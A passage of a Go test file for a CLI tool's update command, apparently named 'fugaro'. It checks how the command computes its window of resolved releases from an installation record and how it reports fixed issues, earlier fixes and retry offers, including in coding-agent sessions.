// update's window to include the fixes the update before it printed, and taking
// the recorded release for X on a re-run narrows it to nothing.
func TestUpdateResolvedWindowIsTheRecordedSpan(t *testing.T) {
	for _, tc := range []struct {
		name string
		// record is the releases the installation record was advanced to, in
		// order; none at all says the bucket holds no record.
		record   []string
		corrupt  bool
		version  string
		previous string
	}{
		{
			name: "the recorded release is the bound when it is below this build",
			// The update before this one spanned 1.2.1..1.2.2, so this one's
			// window starts where that one stopped.
			record:   []string{"1.2.1", convergePrev},
			version:  convergeRelease,
			previous: convergePrev,
		},
		{
			name: "a first record names no release before it",
			// The record's own previous_release is empty and its release is
			// not: the window still starts at the release it holds.
			record:   []string{convergePrev},
			version:  convergeRelease,
			previous: convergePrev,
		},
		{
			name:     "a re-run at this release repeats the window it recorded",
			record:   []string{"1.2.1", convergeRelease},
			version:  convergeRelease,
			previous: "1.2.1",
		},
		{
			name:     "no record is no window",
			version:  convergeRelease,
			previous: "",
		},
		{
			name:     "a record this build cannot read is no window",
			corrupt:  true,
			version:  convergeRelease,
			previous: "",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			retryEnv(t)
			withVersion(t, tc.version)
			b, _ := resolvedBucket(t)
			for _, v := range tc.record {
				if _, err := installrec.Advance(t.Context(), b, v); err != nil {
					t.Fatal(err)
				}
			}
			if tc.corrupt {
				// A record whose release is not a release: the read fails, and
				// a window nobody can answer is left empty rather than guessed
				// at (installrec.Read).
				bad := []byte(`{"format":1,"release":"not-a-release"}`)
				if _, err := b.Create(t.Context(), installrec.Object, bad, "application/json"); err != nil {
					t.Fatal(err)
				}
			}
			got := updateResolvedWindow(t.Context(), b)
			if got.Previous != tc.previous {
				t.Errorf("the window's lower bound is %q, want %q", got.Previous, tc.previous)
			}
			if got.Release != tc.version || got.Running != tc.version {
				t.Errorf("the window is (%q, %q] running %q, want this build's %q at both ends",
					got.Previous, got.Release, got.Running, tc.version)
			}
		})
	}
}

// TestUpdateDoesNotReReportTheLastWindowsFixes: an issue fixed by the release
// the update before this one installed was reported by that update, under its
// own summary. This update's window starts at that release (F17), so the fix is
// not one of the issues "this update fixes" a second time — and it is not
// dropped either: a pass that never got to report it is what the earlier-fixes
// block is for (F6).
func TestUpdateDoesNotReReportTheLastWindowsFixes(t *testing.T) {
	retryEnv(t)
	withVersion(t, convergeRelease)
	b, dir := resolvedBucket(t)
	// The installation has updated twice with a build that writes the record:
	// the last update spanned 1.2.1..1.2.2, which is where this one starts.
	for _, v := range []string{"1.2.1", convergePrev} {
		if _, err := installrec.Advance(t.Context(), b, v); err != nil {
			t.Fatal(err)
		}
	}
	up := resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "")
	// A fix of the release the last update installed, which that update's own
	// pass marked: the issue is still submitted here, so this run's pass finds
	// it again.
	stubUpdateResolve(t, resolvedReader{1234: issueresolve.ClosedCompleted{Milestone: convergePrev}})

	r, out := resolvedRig(t, nil, dir)
	r.updateResolved(t.Context())

	if strings.Contains(out.String(), resolvedSummaryLead) {
		t.Errorf("an update counted the last window's fix as one of its own:\n%s", out.String())
	}
	want := fmt.Sprintf("%s\n#%04d (the update stopped half way)\n", resolvedAlsoHead, up.Number)
	if !strings.Contains(out.String(), want) {
		t.Errorf("the fix before this window was not reported as an earlier one:\n%s", out.String())
	}
}

// TestUpdateResolvedPrintsOneOfferLineInOneRun: the step's line about an issue
// whose command came from this machine's own file and the retry offer's are one
// sentence (resolvedFixedLine, O4), and one run prints it once — the session the
// step ran in makes no difference to what its reader sees. A person's run says
// so with the file's own mark; a coding agent's session makes no mark, there or
// in the offer (F16d), so the run remembers what it printed in memory.
func TestUpdateResolvedPrintsOneOfferLineInOneRun(t *testing.T) {
	for _, tc := range []struct {
		name  string
		agent bool
	}{
		{"a person's own update", false},
		{"a coding agent's session", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			retryEnv(t)
			b, dir := resolvedBucket(t)
			up := resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "")
			// Another machine's update already marked it resolved (F18), so the
			// step has a fix to print with the pass asking GitHub nothing.
			if err := issues.SetResolved(t.Context(), b, up.Number, retryRelease, 0, retryAt); err != nil {
				t.Fatal(err)
			}
			retryFile(t, retryStore(t), up.Number, "fugaro update")
			stubUpdateResolve(t, resolvedReader{})
			if tc.agent {
				t.Setenv(agentMarkers[0], "1")
			}

			// The run's own two steps, in the order the door runs them: the
			// step inside the converge, the offer as the door's last line.
			r, out := resolvedRig(t, nil, dir)
			r.updateResolved(t.Context())
			updateRetryHint(r.cmd, r.o, nil)

			if got := strings.Count(out.String(), resolvedSummaryLead); got != 1 {
				t.Fatalf("the run printed %d summaries, so this test proves nothing:\n%s", got, out.String())
			}
			if got := strings.Count(out.String(), resolvedFixedLine(up.Number, "fugaro update", true)); got != 1 {
				t.Errorf("the run printed the offer line %d times, want once:\n%s", got, out.String())
			}
		})
	}
}

// TestUpdateAlsoFixedLine: a fix whose release is at or below the one the last
// update spanned was fixed before this window, and a machine that met GitHub
// offline is why nobody was told (F6). It is reported, under its own heading,
// rather than silently dropped or mixed into this update's own list.
func TestUpdateAlsoFixedLine(t *testing.T) {
	retryEnv(t)
	withVersion(t, convergeRelease)
	b, dir := resolvedBucket(t)
	for _, v := range []string{"1.2.1", convergePrev} {
		if _, err := installrec.Advance(t.Context(), b, v); err != nil {
			t.Fatal(err)
		}
	}
	up := resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "")
	stubUpdateResolve(t, resolvedReader{1234: issueresolve.ClosedCompleted{Milestone: "1.2.1"}})

	r, out := resolvedRig(t, nil, dir)
	r.updateResolved(t.Context())

	want := fmt.Sprintf("%s\n#%04d (the update stopped half way)\n", resolvedAlsoHead, up.Number)
	if !strings.Contains(out.String(), want) {
		t.Errorf("a fix from before the window was not reported as an earlier one:\n%s", out.String())
	}
	if strings.Contains(out.String(), resolvedSummaryLead) {
		t.Errorf("a fix from before the window was counted as this update's own:\n%s", out.String())
	}
}
